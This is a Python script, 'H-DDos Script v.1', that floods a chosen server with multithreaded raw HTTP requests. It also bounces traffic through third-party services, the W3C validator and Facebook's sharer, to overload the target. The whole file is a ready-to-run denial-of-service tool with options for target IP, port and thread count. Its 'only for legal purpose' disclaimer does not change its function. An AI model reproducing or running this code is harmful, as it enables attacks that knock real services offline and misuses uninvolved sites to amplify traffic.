#!/usr/bin/python3
# -*- coding: utf-8 -*-

# python 3.3.2+ H-DDos Script v.1
# by BENYAMIN
# only for legal purpose

from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random
import sys
import os
import time
import os as sistema

# Set color
if sys.platform in ["linux","linux2"]:
        R = '\033[31m' # Red
        N = '\033[1;37m' # White
        G = '\033[32m' # Green
        O = '\033[0;33m' # Orange
        B = '\033[1;34m' #Blue
else:
        R = ''
        N = ''
        G = ''
        O = ''
        B = ''

os.system('clear')

def runntek(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 100)


runntek("		")
time.sleep(1)

def delay_print(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.01)

delay_print
delay_print ("")
delay_print (""+R+"█████████████████████"+N+"████████████████████████"+R+"█████████████████████\n")

# Banner

print (B+ '		')
print ("""


                                  ,ood8888booo,
                              ,od8           8bo,
                           ,od                   bo,
                         ,d8                       8b, 
                        ,o                           o,    ,a8b    
                       ,8                             8,,od8  8    
                       8'                             d8'     8b   
                       8                           d8'ba     aP'   
                       Y,                       o8'         aP'    
                        Y8,                      YaaaP'    ba      
                         Y8o                   Y8'         88      
                          `Y8               ,8"           `P      
                            Y8o        ,d8P'              ba      
                       ooood8888888P***'                  P*     
                    ,od                                  8       
                 ,dP     o88o                           o'       
                ,dP          8                          8        
               ,d'   oo       8                       ,8         
               $    d$"8      8           Y    Y  o   8          
              d    d  d8    od  **boooooooob   d** 8   8         
              $    8  d   ood' ,   8        b  8    8  b         
              $   $  8  8     d  d8        `b  d    '8  b        
               $  $ 8   b    Y  d8          8 ,P     '8  b       
               `$$  Yb  b     8b 8b         8 8,      '8  o,     
                    `Y  b      8o  $$o      d  b        b   $o   
                     8   *$     8$,,$"      $   $o      '$o$$    
                     $o$$P"                 $$o$  
""")

delay_print (""+R+"█████████████████████"+N+"████████████████████████"+R+"█████████████████████\n")

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)


def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[94mbot is hammering...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mno connection! server maybe down\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print ("")
	print (''' \033[92m	H-DDos Script v.1.0 - Create by BENYAMIN
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. \n
	usage : python3 H-Dos.py [-s] [-p] [-t]
	-h : help
	-s : server ip
	-p : port default 80
	-t : turbo default 135 \033[0m''')
	print ('')
	print ('')
	sys.exit()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="H-Dos")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 135
	else:
		thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
	print("\033[94mPlease wait...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91mcheck server ip and port\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()
